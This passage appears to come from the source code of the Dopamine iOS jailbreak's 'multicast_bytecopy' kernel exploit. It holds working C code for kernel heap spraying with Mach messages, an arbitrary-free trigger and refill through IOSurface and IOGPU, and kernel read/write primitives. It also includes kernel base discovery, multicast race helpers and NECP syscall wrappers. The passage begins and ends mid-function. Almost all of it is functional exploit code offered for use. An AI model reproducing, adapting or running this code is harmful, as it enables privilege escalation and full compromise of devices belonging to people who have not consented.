    free(necp_buf);
    
    return kheap_data_ports[kheap_data_idx];
}

int exploitation_init(void)
{
    // different by device, retrieve it first and fail if unsuccessful
    extra_frees_for_device = IOGPU_get_command_queue_extra_refills_needed();
    if (extra_frees_for_device == -1)
    {
        printf("Exiting early, provide correct number 1-5 in the code for this device to proceed\n");
        return 1;
    }
    
    kheap_data_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    kheap_default_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    mach_port_t *contained_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    mach_port_t *ool_ports = malloc(0x4000);
    uint8_t *kheap_data_spray_buf = malloc(0x4000);
    memset(kheap_data_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(kheap_default_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(contained_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(ool_ports, 0, 0x4000);
    memset(kheap_data_spray_buf, 0, 0x4000);
     
    // initialize the inline data
    
    // fake descriptor for free primitive
    *(uint32_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t)) = 1;
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t)) = KHEAP_DEFAULT_MAPPABLE_LOC; // free primitive target
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t) + sizeof(uint64_t)) = 0x000007F802110000; // disposition, size, etc
    // align a pointer here so that when the kmsg trailer size is corrupted, this pointer
    // will after that be followed and a second bytecopy performed where it points (kmsg message bits)
    *(uint64_t *)(kheap_data_spray_buf + 0x3F64) = BYTECOPY_SECOND_TARGET;
    
    // spray large sprays to map  KHEAP_DATA_MAPPABLE_LOC and KHEAP_DEFAULT_MAPPABLE_LOC
    for (int i = 0; i < PORTS_COUNT; ++i)
    {
        // KHEAP_DEFAULT
        *ool_ports = port_new();
        contained_ports[i] = *ool_ports;
        mach_port_t *pp = spray_default_kalloc_ool_ports(0x4000, 1, ool_ports);
        kheap_default_ports[i] = pp[0];
        free(pp);
        
        // KHEAP_DATA_BUFFERS
        kheap_data_ports[i] = spray_data_kalloc_kmsg_single(kheap_data_spray_buf, KMSG_SIZE);
    }
    
    notif_port = port_new();
    for (int i = 0; i < PORTS_COUNT; ++i)
    {
        mach_port_t prev;
        mach_port_request_notification(mach_task_self(), contained_ports[i], MACH_NOTIFY_NO_SENDERS, 0, notif_port, MACH_MSG_TYPE_MAKE_SEND_ONCE, &prev);
        mach_port_deallocate(mach_task_self(), contained_ports[i]);
    }
    
    // pre-init kernel rw
    IOSurfaceClient_array_buf = malloc(0x4000);
    kernel_rw_preinit(KHEAP_DATA_MAPPABLE_LOC - 0x4000 + 0x10, IOSurfaceClient_array_buf, 0x4000);
    
    free(contained_ports);
    free(ool_ports);
    free(kheap_data_spray_buf);
    
    return 0;
}

int exploitation_get_krw_with_arb_free(mach_port_t arb_free_holder, uint64_t *kernel_base)
{
    uint8_t msg_buf[0x100];
    int fildes[2];
    pipe(fildes);
    int read_pipe = fildes[0];
    int write_pipe = fildes[1];
    
    // alloc this one before array of IOSurfaceClients becomes 0x4000
    io_connect_t iosurface_connect_krw = IOSurfaceRoot_init();

    // cause max size of arrays of IOSurfaceClients to become 0x4000
    uint32_t last_id = IOSurfaceRoot_cause_array_size_to_be_0x4000();
    
    // trigger arbitrary free in kheap default
    port_destroy(arb_free_holder);
    
    // do refill in kheap default
    IOSurfaceRoot_lookup_surface(iosurface_connect_krw, last_id);
    // NULL out array
    IOSurfaceRoot_release_all(iosurface_connect_krw);

    // find allocation at KHEAP_DEFAULT_MAPPABLE_LOC
    int kheap_default_idx = -1;
    for (uint32_t i = 0;
         (i < PORTS_COUNT) && port_has_msg(notif_port);
         i++)
    {
        port_receive_msg(notif_port, msg_buf, sizeof(msg_buf));
       
        port_destroy(kheap_default_ports[i]);

        kheap_default_idx = i;
    }
    
    // Note: don't add time sensitive code here, allocation at KHEAP_DEFAULT_MAPPABLE_LOC
    // has been free'd and will be refilled below
    
    // printf("Allocation at KHEAP_DEFAULT_MAPPABLE_LOC has been free'd\n");
    
    if (kheap_default_idx >= PORTS_COUNT)
    {
        printf("kheap_default_idx >= PORTS_COUNT\n");
        exit(1);
    }
    
    // extra frees
    for (int i = 0; i < extra_frees_for_device; ++i)
    {
        port_destroy(kheap_default_ports[(kheap_default_idx+1)+i]);
    }
    
    // do refill
    iogpu_connect = IOGPU_init();
    // add entry
    IOGPU_create_command_queue(iogpu_connect, KHEAP_DATA_MAPPABLE_LOC - 0x4000 + 0x10);
    
    printf("kheap_default_idx: %08X\n", kheap_default_idx);
    
    // refill in kheap data
    port_destroy(kheap_data_ports[kheap_data_idx-1]);
    write(write_pipe, IOSurfaceClient_array_buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);

    kernel_rw_init(iosurface_connect_krw, 1, read_pipe, write_pipe);
    
    kwrite32(KHEAP_DEFAULT_MAPPABLE_LOC, 0xFEED);
    uint32_t result = kread32(KHEAP_DEFAULT_MAPPABLE_LOC);
    printf("Test kwrite32 and kread32: %08X (should be 0000FEED)\n", result);
    if (result != 0xFEED)
    {
        printf("Failed! Reboot to try again (remember to only run once per boot)\n");
        exit(1);
    }
    
    printf("Get kernel base...\n");
    
    *kernel_base = kernel_base_from_holder(kheap_data_ports[kheap_data_idx-2], KHEAP_DATA_MAPPABLE_LOC - 0x8000);
    printf("Got kernel base: %p\n", (void *)*kernel_base);
    
    return 0;
}

void exploitation_cleanup(void)
{
    uint64_t command_queue_loc = kread64(KHEAP_DEFAULT_MAPPABLE_LOC + 8);
    uint64_t parent_loc = kread64(command_queue_loc + 0x488);
    uint64_t namespace_loc = kread64(parent_loc + 0x88);
    
    // bump refs
    kwrite32(command_queue_loc + 0x8, 10);
    kwrite32(namespace_loc + 0x8, 10);
    
    IOServiceClose(iogpu_connect);
}

int exploit_get_krw_and_kernel_base(uint64_t *kernel_base)
{
    uint64_t _kernel_base = 0;
    
    // generic exploitation init
    if (exploitation_init() != 0)
    {
        return 1;
    }
    
    // trigger bug, get arbitrary free
    mach_port_t arb_free_holder = get_arb_free_holder();
    
    // generic exploitation using arbitrary free
    exploitation_get_krw_with_arb_free(arb_free_holder, &_kernel_base);
    
    *kernel_base = _kernel_base;
    
    return 0;
}

int exploit_go(void)
{
    uint64_t kernel_base = 0;
    
    if (exploit_get_krw_and_kernel_base(&kernel_base) != 0)
    {
        printf("Exploit failed!\n");
        return 1;
    }
    
    // test kernel r/w, read kernel base
    uint32_t mh_magic = kread32(kernel_base);
    if (mh_magic != 0xFEEDFACF)
    {
        printf("mh_magic != 0xFEEDFACF: %08X\n", mh_magic);
        return 1;
    }
    
    printf("kread32(_kernel_base) success: %08X\n", mh_magic);
    
    printf("Done\n");
    
    return 0;
}

```

`Application/Dopamine/Exploits/multicast_bytecopy/exploit/exploit.h`:

```h
#ifndef __EXPLOIT_H__
#define __EXPLOIT_H__

#include <stdint.h>

void exploitation_cleanup(void);
int exploit_get_krw_and_kernel_base(uint64_t *kernel_base);

#endif

```

`Application/Dopamine/Exploits/multicast_bytecopy/exploit/iokit.h`:

```h
// Credits: Siguza
// https://github.com/Siguza/iokit-utils/blob/master/src/iokit.h
#ifndef IOKIT_H
#define IOKIT_H

#include <stdint.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>

typedef char io_name_t[128];
typedef char io_string_t[512];
typedef char io_struct_inband_t[4096];
typedef mach_port_t io_object_t;
typedef io_object_t io_registry_entry_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;
typedef io_object_t io_iterator_t;

enum
{
    kIOCFSerializeToBinary          = 0x00000001U,
};

enum
{
    kIOClassNameOverrideNone        = 0x00000001U,
};

enum
{
    kIOMapAnywhere                  = 0x00000001U,
};

enum
{
    kIORegistryIterateRecursively   = 0x00000001U,
    kIORegistryIterateParents       = 0x00000002U,
};

enum
{
    kOSSerializeDictionary          = 0x01000000U,
    kOSSerializeArray               = 0x02000000U,
    kOSSerializeSet                 = 0x03000000U,
    kOSSerializeNumber              = 0x04000000U,
    kOSSerializeSymbol              = 0x08000000U,
    kOSSerializeString              = 0x09000000U,
    kOSSerializeData                = 0x0a000000U,
    kOSSerializeBoolean             = 0x0b000000U,
    kOSSerializeObject              = 0x0c000000U,

    kOSSerializeTypeMask            = 0x7F000000U,
    kOSSerializeDataMask            = 0x00FFFFFFU,

    kOSSerializeEndCollection       = 0x80000000U,

    kOSSerializeMagic               = 0x000000d3U,
};

extern const mach_port_t kIOMasterPortDefault;

CF_RETURNS_RETAINED CFDataRef IOCFSerialize(CFTypeRef object, CFOptionFlags options);
CFTypeRef IOCFUnserializeWithSize(const char *buf, size_t len, CFAllocatorRef allocator, CFOptionFlags options, CFStringRef *err);

kern_return_t IOObjectRetain(io_object_t object);
kern_return_t IOObjectRelease(io_object_t object);
boolean_t IOObjectConformsTo(io_object_t object, const io_name_t name);
uint32_t IOObjectGetKernelRetainCount(io_object_t object);
kern_return_t IOObjectGetClass(io_object_t object, io_name_t name);
kern_return_t _IOObjectGetClass(io_object_t object, uint64_t options, io_name_t name);
CFStringRef IOObjectCopyClass(io_object_t object);
CFStringRef _IOObjectCopyClass(io_object_t object, uint64_t options);
CFStringRef IOObjectCopySuperclassForClass(CFStringRef name);
CFStringRef IOObjectCopyBundleIdentifierForClass(CFStringRef name);

io_registry_entry_t IORegistryGetRootEntry(mach_port_t master);
io_registry_entry_t IORegistryEntryFromPath(mach_port_t master, const io_string_t path);
kern_return_t IORegistryEntryGetName(io_registry_entry_t entry, io_name_t name);
kern_return_t IORegistryEntryGetRegistryEntryID(io_registry_entry_t entry, uint64_t *entryID);
kern_return_t IORegistryEntryGetPath(io_registry_entry_t entry, const io_name_t plane, io_string_t path);
kern_return_t IORegistryEntryGetProperty(io_registry_entry_t entry, const io_name_t name, io_struct_inband_t buffer, uint32_t *size);
kern_return_t IORegistryEntryCreateCFProperties(io_registry_entry_t entry, CFMutableDictionaryRef *properties, CFAllocatorRef allocator, uint32_t options);
CFTypeRef IORegistryEntryCreateCFProperty(io_registry_entry_t entry, CFStringRef key, CFAllocatorRef allocator, uint32_t options);
kern_return_t IORegistryEntrySetCFProperties(io_registry_entry_t entry, CFTypeRef properties);

kern_return_t IORegistryCreateIterator(mach_port_t master, const io_name_t plane, uint32_t options, io_iterator_t *it);
kern_return_t IORegistryEntryCreateIterator(io_registry_entry_t entry, const io_name_t plane, uint32_t options, io_iterator_t *it);
kern_return_t IORegistryEntryGetChildIterator(io_registry_entry_t entry, const io_name_t plane, io_iterator_t *it);
kern_return_t IORegistryEntryGetParentIterator(io_registry_entry_t entry, const io_name_t plane, io_iterator_t *it);
io_object_t IOIteratorNext(io_iterator_t it);
boolean_t IOIteratorIsValid(io_iterator_t it);
void IOIteratorReset(io_iterator_t it);

CFMutableDictionaryRef IOServiceMatching(const char *name) CF_RETURNS_RETAINED;
CFMutableDictionaryRef IOServiceNameMatching(const char *name) CF_RETURNS_RETAINED;
io_service_t IOServiceGetMatchingService(mach_port_t master, CFDictionaryRef matching CF_RELEASES_ARGUMENT);
kern_return_t IOServiceGetMatchingServices(mach_port_t master, CFDictionaryRef matching CF_RELEASES_ARGUMENT, io_iterator_t *it);
kern_return_t _IOServiceGetAuthorizationID(io_service_t service, uint64_t *authID);
kern_return_t _IOServiceSetAuthorizationID(io_service_t service, uint64_t authID);
kern_return_t IOServiceGetBusyStateAndTime(io_service_t service, uint64_t *state, uint32_t *busyState, uint64_t *busyTime);
kern_return_t IOServiceOpen(io_service_t service, task_t task, uint32_t type, io_connect_t *client);
kern_return_t IOServiceClose(io_connect_t client);
kern_return_t IOCloseConnection(io_connect_t client);
kern_return_t IOConnectAddRef(io_connect_t client);
kern_return_t IOConnectRelease(io_connect_t client);
kern_return_t IOConnectGetService(io_connect_t client, io_service_t *service);
kern_return_t IOConnectAddClient(io_connect_t client, io_connect_t other);
kern_return_t IOConnectSetNotificationPort(io_connect_t client, uint32_t type, mach_port_t port, uintptr_t ref);
kern_return_t IOConnectMapMemory64(io_connect_t client, uint32_t type, task_t task, mach_vm_address_t *addr, mach_vm_size_t *size, uint32_t options);
kern_return_t IOConnectUnmapMemory64(io_connect_t client, uint32_t type, task_t task, mach_vm_address_t addr);
kern_return_t IOConnectSetCFProperties(io_connect_t client, CFTypeRef properties);
kern_return_t IOConnectCallMethod(io_connect_t client, uint32_t selector, const uint64_t *in, uint32_t inCnt, const void *inStruct, size_t inStructCnt, uint64_t *out, uint32_t *outCnt, void *outStruct, size_t *outStructCnt);
kern_return_t IOConnectCallScalarMethod(io_connect_t client, uint32_t selector, const uint64_t *in, uint32_t inCnt, uint64_t *out, uint32_t *outCnt);
kern_return_t IOConnectCallStructMethod(io_connect_t client, uint32_t selector, const void *inStruct, size_t inStructCnt, void *outStruct, size_t *outStructCnt);
kern_return_t IOConnectCallAsyncMethod(io_connect_t client, uint32_t selector, mach_port_t wake_port, uint64_t *ref, uint32_t refCnt, const uint64_t *in, uint32_t inCnt, const void *inStruct, size_t inStructCnt, uint64_t *out, uint32_t *outCnt, void *outStruct, size_t *outStructCnt);
kern_return_t IOConnectCallAsyncScalarMethod(io_connect_t client, uint32_t selector, mach_port_t wake_port, uint64_t *ref, uint32_t refCnt, const uint64_t *in, uint32_t inCnt, uint64_t *out, uint32_t *outCnt);
kern_return_t IOConnectCallAsyncStructMethod(io_connect_t client, uint32_t selector, mach_port_t wake_port, uint64_t *ref, uint32_t refCnt, const void *inStruct, size_t inStructCnt, void *outStruct, size_t *outStructCnt);
kern_return_t IOConnectTrap6(io_connect_t client, uint32_t index, uintptr_t a, uintptr_t b, uintptr_t c, uintptr_t d, uintptr_t e, uintptr_t f);

#endif

```

`Application/Dopamine/Exploits/multicast_bytecopy/exploit/kernel_base.c`:

```c
#include "kernel_base.h"

#include "kernel_rw.h"
#include "port_utils.h"
#include "spray.h"
#include "xpaci.h" // ptrauth.h replacement

#include <stdio.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/syscall.h>

#pragma clang diagnostic ignored "-Wdeprecated-declarations" // syscall

uint64_t kernel_base_from_holder(mach_port_t holder, uint64_t holder_addr)
{
    uint64_t kernel_base = 0;
    const int receive_size = 0x10000; // Doesn't really matter
    const int data_kalloc_size = 0x50; // Doesn't really matter
    uint8_t *buf = calloc(1, receive_size);
    mach_port_t fileport = MACH_PORT_NULL;
    
    // read out port pointer
    uint64_t port_addr = kread64(holder_addr + 8);
    
    // init fileport
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    syscall(SYS_fileport_makeport, sock, &fileport);
    
    // send new message contaning port
    port_receive_msg(holder, buf, receive_size);
    spray_default_kalloc_ool_ports_with_data_kalloc_size_on_port(sizeof(void *), &fileport, data_kalloc_size, holder);
    
    // read kernel text pointer fops
    uint64_t kmsg = kread64(port_addr + 0x30);
    uint64_t ikm_header = xpaci(kread64(kmsg + 0x18));
    uint64_t oolp_array = kread64(ikm_header + 0x24);
    uint64_t oolp = kread64(oolp_array);
    uint64_t kobject = xpaci(kread64(oolp + 0x58));
    uint64_t fops = kread64(kobject + 0x28);
    
    // find kernel base
    uint64_t pos = (fops & ~0x3FFF);
    do
    {
        pos -= 0x4000;
    } while (kread32(pos) != 0xFEEDFACF);
    kernel_base = pos;
    
    // cleanup
    close(sock);
    port_deallocate_n(&fileport, 1);
    
    return kernel_base;
}

```

`Application/Dopamine/Exploits/multicast_bytecopy/exploit/kernel_base.h`:

```h
#ifndef __KERNEL_BASE_H__
#define __KERNEL_BASE_H__

#include <mach/mach.h>
#include <stdint.h>

uint64_t kernel_base_from_holder(mach_port_t holder, uint64_t holder_addr);

#endif

```

`Application/Dopamine/Exploits/multicast_bytecopy/exploit/kernel_rw.c`:

```c
#include "kernel_rw.h"

#include "IOSurfaceRoot.h"

static io_connect_t _uc;
static uint32_t _surf_id;
static int _read_pipe;
static int _write_pipe;
static uint64_t _mapped_address;

void kernel_rw_preinit(uint64_t kaddr, uint8_t *buf, size_t n)
{
    memset(buf, 0x07, n);

    *(uint64_t *)(buf + 0x10 + 0x40) = kaddr+ 0x10; // IOSurfaceClient->IOSurface
    *(uint64_t *)(buf + 0x10 + 0xB0) = 1; // See IOSurface::setCompressedTileDataRegionMemoryUsedOfPlane
    *(uint64_t *)(buf + 0x10 + 0xC0 + 0x18) = kaddr + 0x20 - 0xA0; // Write destination (+0xA0 added)
    
    _mapped_address = kaddr;
}

int kernel_rw_init(io_connect_t uc, uint32_t surf_id, int read_pipe, int write_pipe)
{
    _uc = uc;
    _surf_id = surf_id;
    _read_pipe = read_pipe;
    _write_pipe = write_pipe;
    
    return 0;
}

uint32_t kread32(uint64_t kaddr)
{
    uint8_t buf[KERNEL_RW_SIZE_FAKE_ARRAY];
    
    read(_read_pipe, buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);
    
    *(uint64_t *)(buf+ 0x10 + 0x40) = kaddr+ 0x10; // IOSurfaceClient->IOSurface
    *(uint64_t *)(buf+ 0x10 + 0xC0 ) = kaddr - 0x14; // Write destination (+0xA0 added)
    
    write(_write_pipe, buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);
    
    return IOSurfaceRoot_get_surface_use_count(_uc, _surf_id);
}

uint64_t kread64(uint64_t kaddr)
{
    uint8_t b[8];
    
    *(uint32_t *)b = kread32(kaddr);
    *(uint32_t *)(b + 4) = kread32(kaddr + 4);
    
    return *(uint64_t *)b;
}

void kwrite32(uint64_t kaddr, uint32_t val)
{
    uint8_t buf[KERNEL_RW_SIZE_FAKE_ARRAY];
    
    read(_read_pipe, buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);
    
    *(uint64_t *)(buf + 0x10 + 0x40) = kaddr+ 0x10; // IOSurfaceClient->IOSurface
    *(uint64_t *)(buf + 0x10 + 0xB0) = 1; // See IOSurface::setCompressedTileDataRegionMemoryUsedOfPlane
    *(uint64_t *)(buf + 0x10 + 0xC0) = kaddr - 0xA0; // Write destination (+0xA0 added)
    
    write(_write_pipe, buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);
    
    IOSurfaceRoot_set_compressed_tile_data_region_memory_used_of_plane(_uc, _surf_id, val);
}

void kwrite64(uint64_t kaddr, uint64_t val)
{
    kwrite32(kaddr, (uint32_t)val);
    kwrite32(kaddr + 4, (uint32_t)(val >> 32));
}

```

`Application/Dopamine/Exploits/multicast_bytecopy/exploit/kernel_rw.h`:

```h
#ifndef __KERNEL_RW_H__
#define __KERNEL_RW_H__

#define KERNEL_RW_SIZE_FAKE_ARRAY 0x4000

#include "iokit.h"

void kernel_rw_preinit(uint64_t kaddr, uint8_t *buf, size_t n);
int kernel_rw_init(io_connect_t uc, uint32_t surf_id, int read_pipe, int write_pipe);

uint32_t kread32(uint64_t kaddr);
uint64_t kread64(uint64_t kaddr);

void kwrite32(uint64_t kaddr, uint32_t val);
void kwrite64(uint64_t kaddr, uint64_t val);

#endif


```

`Application/Dopamine/Exploits/multicast_bytecopy/exploit/mcast.c`:

```c
#include "mcast.h"

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <string.h>

int mcast_race_sock;

int mcast_join_group(int ip)
{
    struct group_req mreq = { 0 };
    struct sockaddr_in6 sin6 = {0};
    
    mreq.gr_interface = 1;

    sin6.sin6_len = sizeof(sin6);
    sin6.sin6_family = AF_INET6;
    sin6.sin6_port = 7878;
    sin6.sin6_addr.__u6_addr.__u6_addr32[3] = 0;
    sin6.sin6_addr.__u6_addr.__u6_addr32[2] = 0;
    sin6.sin6_addr.__u6_addr.__u6_addr32[1] = ip;
    sin6.sin6_addr.__u6_addr.__u6_addr32[0] = (htonl(0xFF000000));

    memcpy(&mreq.gr_group, &sin6, sizeof(sin6));
    
    mreq.gr_interface = 1;
    
    return setsockopt(mcast_race_sock, IPPROTO_IPV6, MCAST_JOIN_GROUP, &mreq, sizeof(mreq));
}

void mcast_increase_race_reliability(void)
{
    struct group_req mreq = { 0 };
    struct sockaddr_in6 sin6 = {0};
    int s = socket(AF_INET6, SOCK_DGRAM, 0);
    
    mreq.gr_interface = 1;

    sin6.sin6_len = sizeof(sin6);
    sin6.sin6_family = AF_INET6;
    sin6.sin6_port = 7878;
    sin6.sin6_addr.__u6_addr.__u6_addr32[3] = 0;
    sin6.sin6_addr.__u6_addr.__u6_addr32[2] = 0;
    sin6.sin6_addr.__u6_addr.__u6_addr32[1] = 0;
    sin6.sin6_addr.__u6_addr.__u6_addr32[0] = (htonl(0xFF000000));

    memcpy(&mreq.gr_group, &sin6, sizeof(sin6));

    for (int i = 0; i < 3000; ++i)
    {
        ((struct sockaddr_in6 *)(&mreq.gr_group))->sin6_addr.__u6_addr.__u6_addr32[1] = i + (3000 * 3000);
        setsockopt(s, IPPROTO_IPV6, MCAST_JOIN_GROUP, &mreq, sizeof(mreq));
    }
}

```

`Application/Dopamine/Exploits/multicast_bytecopy/exploit/mcast.h`:

```h
#ifndef __MCAST_H__
#define __MCAST_H__

extern int mcast_race_sock;

void mcast_increase_race_reliability(void);
int mcast_join_group(int ip);

#endif

```

`Application/Dopamine/Exploits/multicast_bytecopy/exploit/necp.c`:

```c
#include "necp.h"

#include <sys/syscall.h>
#include <unistd.h>

#pragma clang diagnostic ignored "-Wdeprecated-declarations"

int necp_open(int flags)
{
    return syscall(SYS_necp_open, flags);
}

int necp_client_action(int necp_fd, uint32_t action, uint8_t *client_id, size_t client_id_len, uint8_t *buffer, size_t buffer_size)
{
    return syscall(SYS_necp_client_action, necp_fd, action, client_id, client_id_len, buffer, buffer_size);
}

```

`Application/Dopamine/Exploits/multicast_bytecopy/exploit/necp.h`:

```h
#ifndef __NECP_H__
#define __NECP_H__

#include <stdlib.h>
#include <stdint.h>

int necp_open(int flags);
int necp_client_action(int necp_fd, uint32_t action, uint8_t *client_id, size_t client_id_len, uint8_t *buffer, size_t buffer_size);

#endif

```

`Application/Dopamine/Exploits/multicast_bytecopy/exploit/port_utils.c`:

```c
#include "port_utils.h"

#include <mach/mach.h>
#include <stdlib.h>

#pragma clang diagnostic ignored "-Wdeprecated-declarations" // mach_port_destroy

mach_port_t port_new(void)
{
    mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
    mach_port_t port;
    
    mach_port_construct(mach_task_self(), &options, 0, &port);
    
    return port;
}

void port_destroy(mach_port_t p)
{
    mach_port_destroy(mach_task_self(), p);
}

void port_deallocate(mach_port_t p)
{
    mach_port_deallocate(mach_task_self(), p);
}

void port_destroy_n(mach_port_t *p, unsigned int count)
{
    for (int i = 0; i < count; ++i)
    {
        mach_port_destroy(mach_task_self(), p[i]);
        p[i] = 0;
    }
}

void port_deallocate_n(mach_port_t *p, unsigned int count)
{
    for (int i = 0; i < count; ++i)
    {
        mach_port_deallocate(mach_task_self(), p[i]);
    }
}

int port_has_msg(mach_port_t p)
{
    mach_msg_header_t msg = { 0 };

    mach_msg(&msg, MACH_RCV_LARGE | MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, 0x10, p, 0, 0);

    return msg.msgh_size;
}

int port_peek_trailer_size(mach_port_t p)
{
    mach_port_seqno_t msg_seqno = 0;
    mach_msg_size_t msg_size = 0;
    mach_msg_id_t msg_id = 0;
    mach_msg_trailer_t msg_trailer;
    mach_msg_type_number_t msg_trailer_size = sizeof(msg_trailer);
    
    mach_port_peek(mach_task_self(),
                                  p,
                                  MACH_RCV_TRAILER_NULL,
                                  &msg_seqno,
                                  &msg_size,
                                  &msg_id,
                                  (mach_msg_trailer_info_t)&msg_trailer,
                                  &msg_trailer_size);

    return msg_trailer.msgh_trailer_size;
}

void port_receive_msg(mach_port_t p, uint8_t *buf, unsigned int n)
{
    mach_msg((mach_msg_header_t *)buf,
              MACH_RCV_MSG | MACH_MSG_TIMEOUT_NONE,
              0,
              n,
              p,
              0,
              0);
}

void port_receive_msg_n(mach_port_t *p, unsigned int count)
{
    uint8_t buf[0x1000];
    
    for (int i = 0; i < count; ++i)
    {
        port_receive_msg(p[i], buf, 8);
    }
}

void port_receive_msg_all_n(mach_port_t *p, unsigned int count)
{
    uint8_t buf[0x1000];
    
    for (int i = 0; i < count; ++i)
    {
        do
        {
            port_receive_msg(p[i], buf, 8);
        } while (port_has_msg(p[i]));
    }
}

void port_receive_msg_and_deallocate_n(mach_port_t *p, unsigned int count)
{
    port_receive_msg_n(p, count);
    port_deallocate_n(p, count);
    for (int i = 0; i < count; ++i)
    {
        p[i] = MACH_PORT_NULL;
    }
}

```

`Application/Dopamine/Exploits/multicast_bytecopy/exploit/port_utils.h`:

```h
#ifndef __PORT_UTILS_H__
#define __PORT_UTILS_H__

#include <mach/mach.h>

mach_port_t port_new(void);

void port_destroy(mach_port_t p);
void port_deallocate(mach_port_t p);

void port_destroy_n(mach_port_t *p, unsigned int count);
void port_deallocate_n(mach_port_t *p, unsigned int count);

int port_has_msg(mach_port_t p);
int port_peek_trailer_size(mach_port_t p);

void port_receive_msg(mach_port_t p, uint8_t *buf, unsigned int size);
void port_receive_msg_n(mach_port_t *p, unsigned int count);

void port_receive_msg_and_deallocate_n(mach_port_t *p, unsigned int count);

#endif

```

`Application/Dopamine/Exploits/multicast_bytecopy/exploit/spray.c`:

```c
#include "spray.h"

#include "necp.h"

#include <mach/mach.h>
#include <stdlib.h>

mach_port_t *spray_data_kalloc_kmsg(uint8_t *data, unsigned int size, unsigned int count)
{
    mach_port_t *ports = calloc(sizeof(mach_port_t), count);
    mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
    mach_msg_header_t *msg = (mach_msg_header_t *)data;
    
    memset(msg, 0, sizeof(mach_msg_header_t));
    msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->msgh_size = size;
    
    for (unsigned int i = 0; i < count; ++i)
    {
        mach_port_construct(mach_task_self(), &options, 0, &ports[i]);
    }
    
    for (unsigned int i = 0; i < count; ++i)
    {
        msg->msgh_remote_port = ports[i];
        msg->msgh_id = i;
        mach_msg_send(msg);
    }
    
    return ports;
}

mach_port_t spray_data_kalloc_kmsg_single(uint8_t *data, unsigned int size)
{
    mach_port_t port = MACH_PORT_NULL;
    mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
    mach_msg_header_t *msg = (mach_msg_header_t *)data;
    
    memset(msg, 0, sizeof(mach_msg_header_t));
    msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->msgh_size = size;
    
    mach_port_construct(mach_task_self(), &options, 0, &port);

    msg->msgh_remote_port = port;
    mach_msg_send(msg);
    
    return port;
}

void spray_data_kalloc_kmsg_on_ports(uint8_t *data, unsigned int size, unsigned int count, mach_port_t *ports)
{
    mach_msg_header_t *msg = (mach_msg_header_t *)data;
    
    memset(msg, 0, sizeof(mach_msg_header_t));
    msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->msgh_size = size;
    //memcpy(msg + 1, data, size-sizeof(*msg));
    
    for (unsigned int i = 0; i < count; ++i)
    {
        msg->msgh_remote_port = ports[i];
        msg->msgh_id = i;
        mach_msg_send(msg);
    }
}


mach_port_t *spray_data_kalloc_ool_descriptor(uint8_t *data, unsigned int size, unsigned int count)
{
    mach_port_t *ports = calloc(sizeof(mach_port_t), count);
    mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
    mach_msg_header_t *msg = (mach_msg_header_t *)calloc(1, size);
    
    msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->msgh_size = size;
    
    for (unsigned int i = 0; i < count; ++i)
    {
        mach_port_construct(mach_task_self(), &options, 0, &ports[i]);
    }
    
    for (unsigned int i = 0; i < count; ++i)
    {
        msg->msgh_remote_port = ports[i];
        mach_msg_send(msg);
    }
    
    free(msg);
    
    return ports;
}

mach_port_t *spray_default_kalloc_ool_ports(unsigned int size, unsigned int count, mach_port_t *ool_ports)
{
    return spray_default_kalloc_ool_ports_with_data_kalloc_size(size, count, ool_ports, 0x50);
}

mach_port_t *spray_default_kalloc_ool_ports_with_data_kalloc_size(unsigned int size, unsigned int count, mach_port_t *ool_ports, unsigned int data_kalloc_size)
{
    struct default_msg
    {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_ool_ports_descriptor_t desc;
    };
    
    mach_port_t *ports = calloc(sizeof(mach_port_t), count);
    mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
    struct default_msg *msg = (struct default_msg *)calloc(1, 0x100);
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_bits  |= MACH_MSGH_BITS_COMPLEX;
    msg->hdr.msgh_size = data_kalloc_size;
    msg->body.msgh_descriptor_count = 1;
    
    msg->desc.deallocate = 0;
    msg->desc.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->desc.copy = MACH_MSG_VIRTUAL_COPY;
    msg->desc.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg->desc.count = size/8;
    msg->desc.address = (void *)ool_ports;
    
    for (unsigned int i = 0; i < count; ++i)
    {
        mach_port_construct(mach_task_self(), &options, 0, &ports[i]);
    }
    
    for (unsigned int i = 0; i < count; ++i)
    {
        msg->hdr.msgh_remote_port = ports[i];
        kern_return_t kr = mach_msg_send((mach_msg_header_t *)msg);
        if (kr) {
            *(int *)1 = 0;
        }
    }
    
    free(msg);

    return ports;
}

void spray_default_kalloc_ool_ports_on_port(unsigned int size, unsigned int count, mach_port_t *ool_ports, mach_port_t p)
{
